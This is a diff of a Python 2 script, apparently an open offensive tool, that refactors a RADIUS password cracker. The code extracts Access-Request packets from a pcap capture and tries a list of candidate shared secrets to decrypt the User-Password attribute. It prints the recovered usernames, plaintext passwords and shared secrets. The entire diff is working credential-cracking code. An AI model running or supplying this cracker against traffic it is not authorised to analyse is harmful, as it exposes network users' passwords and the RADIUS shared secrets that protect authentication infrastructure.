@@ -3,6 +3,7 @@ import hashlib
 import dpkt
 import socket
 
+# Preforms one iteration of radius decryption
 def rad_decrypt(sec,auth,crypt):
   m = hashlib.md5()
   m.update(sec+auth)
@@ -12,10 +13,14 @@ def rad_decrypt(sec,auth,crypt):
     password += chr(ord(m[i])^ord(crypt[i]))
   return password  
 
+# returns true if a string is readable ascii
 def is_ascii(s):
   return all((ord(c) < 128 and ord(c) >31) or ord(c)==0 for c in s)
 
-def crack_pcap(secretlist, pcapFile):
+
+# Returns a list of radius packets, ip address pairs
+def get_auth_packets(pcapFile):
+  radPacket = []
   p = open(pcapFile, "rb")
   pcap = dpkt.pcap.Reader(p)
   for ts, buf in pcap:
@@ -23,37 +28,48 @@ def crack_pcap(secretlist, pcapFile):
     ip = eth.data
     udp = ip.data
     if type(udp)==dpkt.udp.UDP and udp.dport==1812:
-      auth = udp.data[4:20]
-      cur = 20
-      curlen = ord(udp.data[cur+1:cur+2])
-      username = "Not Found"
-      while ord(udp.data[cur:cur+1])!=2:
-        if ord(udp.data[cur:cur+1])==1:
-          username = udp.data[cur+2:cur+curlen]
-        cur += curlen
-        curlen = ord(udp.data[cur+1:cur+2])
-      crypt = udp.data[cur+2:cur+curlen]
-      all_passwords = {}
-      for secret in secretlist:
-        secret = secret.strip()
-        curpass = auth
-        password = ""
-        i = 0
-        while i < len(crypt):
-          password += rad_decrypt(secret,curpass,crypt[i:i+16])
-          curpass = crypt[i:i+16]
-          i+=16
-        if is_ascii(password):
-          all_passwords[secret]=password
-          print " "
-          print "[*] Possible Radius Password Found"
-          print "[*] Radius Server: "+socket.inet_ntoa(ip.dst)
-          print "[*] Username: "+username          
-          print "[*] Password: "+password
-          print "[*] Shared Secret: "+secret  
-          print " "
-
+      radPacket.append((udp.data,ip.dst))
   p.close()
+  print "[*] Found "+str(len(radPacket))+" Radius Packets"
+  return radPacket
+
+
+# Primary function that takes a pcap file and list of secrets
+# and cracks them
+def crack_pcap(secretlist, pcapFile):
+  print "\n[*] Cracking Radius Packets..."  
+  for udpdata, ipdst in get_auth_packets(pcapFile):
+    auth = udpdata[4:20]
+    cur = 20
+    curlen = ord(udpdata[cur+1:cur+2])
+    username = "Not Found"
+    while ord(udpdata[cur:cur+1])!=2:
+      if ord(udpdata[cur:cur+1])==1:
+        username = udpdata[cur+2:cur+curlen]
+      cur += curlen
+      curlen = ord(udpdata[cur+1:cur+2])
+    crypt = udpdata[cur+2:cur+curlen]
+    all_passwords = {}
+    for secret in secretlist:
+      secret = secret.strip()
+      curpass = auth
+      password = ""
+      i = 0
+      while i < len(crypt):
+        password += rad_decrypt(secret,curpass,crypt[i:i+16])
+        curpass = crypt[i:i+16]
+        i+=16
+      if is_ascii(password):
+        all_passwords[secret]=password
+        print " "
+        print "[*] Possible Radius Password Found"
+        print "[*] Radius Server: "+socket.inet_ntoa(ipdst)
+        print "[*] Username: "+username          
+        print "[*] Password: "+password
+        print "[*] Shared Secret: "+secret  
+        print " "
+
+
   print "[*] DONE "
   return (username, all_passwords)
 
